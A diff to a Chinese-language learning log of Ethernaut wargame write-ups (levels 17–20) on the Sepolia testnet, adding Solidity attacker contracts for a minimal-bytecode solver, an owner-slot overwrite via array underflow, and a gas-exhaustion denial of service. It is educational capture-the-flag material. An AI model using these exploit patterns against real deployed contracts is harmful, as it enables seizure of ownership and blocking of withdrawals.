@@ -721,10 +721,10 @@ contract Attacker {
 
 执行脚本：
 ```
-forge script script/level17.s.sol:CallContractScript --rpc-url sepolia --broadcast
+forge script script/Level17.s.sol:CallContractScript --rpc-url sepolia --broadcast
 ```
 
-完整代码见：[这里](Writeup/phipupt/ethernaut/src/Level17.sol)
+完整代码见：[这里](Writeup/phipupt/ethernaut/script/Level17.s.sol)
 
 
 
@@ -751,9 +751,159 @@ forge script script/level17.s.sol:CallContractScript --rpc-url sepolia --broadca
 
 [The Ethernaut level 18](https://ethernaut.openzeppelin.com/level/18)
 
+这个挑战要求提供一个 `Solver` 合约，合约有一个方法 `whatIsTheMeaningOfLife()`，返回一个32字节数字。另外，要求 `Solver` 合约的代码需要非常小，最多不超过 10 字节。
 
-这个挑战要求提供一个 solver 合约，合约有一个方法 whatIsTheMeaningOfLife()，返回正确的数字。另外，要求 solver 的代码需要非常小，最多不超过 10 字节。
+按正常逻辑编写一个一个 `Solver` 合约很简单，但是字节码会超过 10 字节。可以借用 fallback 函数，不管调用哪个方法都返回42(0x2a)。然后通过最小代理合约的方式来部署合约运行字节码。
 
-按正常逻辑编写一个一个 solver 合约很简单，但是字节码会超过 10 字节。可以借用 fallback 函数，不管调用哪个方法都返回一个数字，
+`Solver` 合约运行字节码 `0x602A60005260206000F3`：
+
+```
+[00]    PUSH1   2a
+[02]    PUSH1   00
+[04]    MSTORE  
+[05]    PUSH1   20
+[07]    PUSH1   00
+[09]    RETURN
+```
+
+最终，RETURN 操作返回长度为 32 字节的数据，从内存地址 `0x00` 开始。这些数据包括前面的 `0x2a` 和接下来的零填充数据。
+
+
+攻击者合约：
+```
+contract Attacker {
+    MagicNum level;
+
+    constructor(address level_) {
+        level = MagicNum(level_);
+    }
+
+    function attack() public {
+        address solverInstance;
+        assembly {
+            let ptr := mload(0x40)
+            mstore(ptr, shl(0x68, 0x69602A60005260206000F3600052600A6016F3))
+            solverInstance := create(0, ptr, 0x13)
+        }
+
+        level.setSolver(solverInstance);
+    }
+}
+```
+
+执行脚本：
+```
+forge script script/Level18.s.sol:CallContractScript --rpc-url sepolia --broadcast
+```
+
+完整代码见：[这里](../../ethernaut/script/Level18.s.sol)
+
+链上记录：
+- [level(`MagicNum`)](https://sepolia.etherscan.io/address/0xdff2caaA0F67561139dB317905fE9636c5Ea2E99)
+- [Attacker](https://sepolia.etherscan.io/tx/0x325D2bc3c4693841147286b9AeB593d85D04aE2a)
+- [attack 交易](https://sepolia.etherscan.io/tx/0xfffec08fd1e3850ec9de4760c2accb84e7a2585c7624cf1427309829d70fe532)
+- [Solver 合约](https://sepolia.etherscan.io/tx/0xf21c470b8ec3f834eb809dc3ef65b469d325dca4)
+
+
+### 2024.09.17
+
+[The Ethernaut level 19](https://ethernaut.openzeppelin.com/level/19)
+
+这一关的目的是成为的 `AlienCodex` 合约的 owner。
+
+仔细阅读合约，`AlienCodex` 合约并没有提供更改 `owner` 相关的函数。但是继承了 `Ownable` 合约，该合约有一个 `address private _owner` 状态变量。`AlienCodex` 合约表面上只提供了修改 `codex` 动态数组的功能。但是，该 solidity 是 ^5.0.0，没有提供溢出保护。因此，可以从这里入手，通过计算指定存储槽的值，修改 `codex` 数组的值，进而覆盖 `owner` 变量所在槽的值。
+
+合约存储布局如下：
+
+x = keccak256(1)
+| slot | value |
+| ---- | ---- |
+|slot(0)     | owner(20) contact(1)  |
+|slot(1)     | codex 的长度  |
+|...         | ...  |
+|...         | ...  |
+|slot(x)     | codex[0]  |
+|slot(x+1)   | codex[1]  |
+|...         | ...  |
+|slot(0)   | codex[0-x] |
+
+
+攻击者合约：
+```
+contract Attacker {
+    IAlienCodex level;
+
+    constructor(address level_) {
+        level = IAlienCodex(level_);
+    }
+
+    function attack() public {
+        level.makeContact();
+
+        level.retract();
+
+        uint256 slotCodex =  uint(keccak256(abi.encode(1)));
+        uint256 slotTarget;
+        unchecked {
+            slotTarget = 0 - slotCodex;
+        }
+
+        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
+        level.revise(slotTarget, myAddress);
+    }
+}
+```
+
+执行脚本：
+```
+forge script script/level19.s.sol:CallContractScript --rpc-url sepolia --broadcast
+```
+
+完整代码见：[这里](Writeup/phipupt/ethernaut/script/Level19.s.sol)
+
+链上记录：
+- [level(`AlienCodex`)](https://sepolia.etherscan.io/address/0x76fC80CEDE65348d96FD4e03d0f0e2Feb46Dfd66)
+- [Attacker](https://sepolia.etherscan.io/tx/0x66B10B1ADEF6Ef9d145928C1BA497E99e94B5ba2)
+- [attack 交易](https://sepolia.etherscan.io/tx/0xc5558634733c89877e78c9d947245faafa014864d17d50e14a72c9409e20a154)
+
+
+### 2024.09.18
+
+[The Ethernaut level 20](https://ethernaut.openzeppelin.com/level/20)
+
+这一关的目的阻止 `owner` 从 `Denial` 合约中提取（`withdraw`）资金 。
+
+仔细阅读合约，`Denial` 合约，任何人都可以调用 `withdraw` 方法提取资金。每次提取时各自转账 1% 的资金 `partner` 和 `owner`。
+转账首先使用 `call` 向 `partner` 转账，没有检查返回值！（这里很关键）。然后 使用 `transfer` 向  `owner` 转账。
+要想拒绝 `owner` 提取资金，只需要在向 `partner` 转账时搞点破坏就可以了，比如 `partner` 合约里 `receive` 函数内部的无限循环，交易最终将耗尽 gas 回退。
+
+
+攻击者合约：
+```
+contract Attacker {
+    uint256 counter = 0;
+
+    constructor() {}
+
+    receive() external payable {
+        for (uint256 i = 0; i < 2 ** 256 - 1; i++) {
+            counter += 1;
+        }
+    }
+}
+```
+
+执行脚本：
+```
+forge script script/Level20.s.sol:CallContractScript --rpc-url sepolia --broadcast
+```
+
+完整代码见：[这里](Writeup/phipupt/ethernaut/script/Level20.s.sol)
+
+链上记录：
+- [level(`Denial`)](https://sepolia.etherscan.io/address/0x1536F390ACb7a8097903F2515b4EEb35a091a633)
+- [Attacker(partner)](https://sepolia.etherscan.io/tx/0xAFB2EA284cAb965258c4BC3Dcf10C4b6f9f4728A)
+- [attack 交易](https://sepolia.etherscan.io/tx/0xc697d7d3a5c1fdcaaa7545671af0c738b48984c82ca8de22f7ed7b23e001c09e)
+
 
 <!-- Content_END -->
